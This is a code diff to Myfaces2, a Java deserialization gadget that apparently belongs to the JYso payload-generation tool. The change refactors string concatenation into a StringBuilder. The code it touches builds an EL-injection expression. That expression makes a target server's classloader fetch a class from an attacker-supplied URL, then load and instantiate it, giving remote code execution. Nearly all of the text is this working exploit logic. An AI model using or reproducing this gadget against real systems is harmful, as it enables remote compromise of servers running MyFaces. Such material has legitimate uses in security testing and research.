@@ -2,6 +2,7 @@ package com.qi4l.JYso.gadgets;
 
 import com.qi4l.JYso.gadgets.utils.DynamicDependencies;
 
+@SuppressWarnings({"unused"})
 public class Myfaces2 implements ObjectPayload<Object>, DynamicDependencies {
     @Override
     public Object getObject(String command) throws Exception {
@@ -15,15 +16,14 @@ public class Myfaces2 implements ObjectPayload<Object>, DynamicDependencies {
         String className = command.substring(sep + 1);
 
         // based on http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/
-        String expr = "${request.setAttribute('arr',''.getClass().forName('java.util.ArrayList').newInstance())}";
+        StringBuilder expr = new StringBuilder("${request.setAttribute('arr',''.getClass().forName('java.util.ArrayList').newInstance())}");
 
         // if we add fewer than the actual classloaders we end up with a null entry
         for (int i = 0; i < 100; i++) {
-            expr += "${request.getAttribute('arr').add(request.servletContext.getResource('/').toURI().create('" + url + "').toURL())}";
+            expr.append("${request.getAttribute('arr').add(request.servletContext.getResource('/').toURI().create('").append(url).append("').toURL())}");
         }
-        expr += "${request.getClass().getClassLoader().newInstance(request.getAttribute('arr')"
-                + ".toArray(request.getClass().getClassLoader().getURLs())).loadClass('" + className + "').newInstance()}";
+        expr.append("${request.getClass().getClassLoader().newInstance(request.getAttribute('arr')" + ".toArray(request.getClass().getClassLoader().getURLs())).loadClass('").append(className).append("').newInstance()}");
 
-        return Myfaces1.makeExpressionPayload(expr);
+        return Myfaces1.makeExpressionPayload(expr.toString());
     }
 }
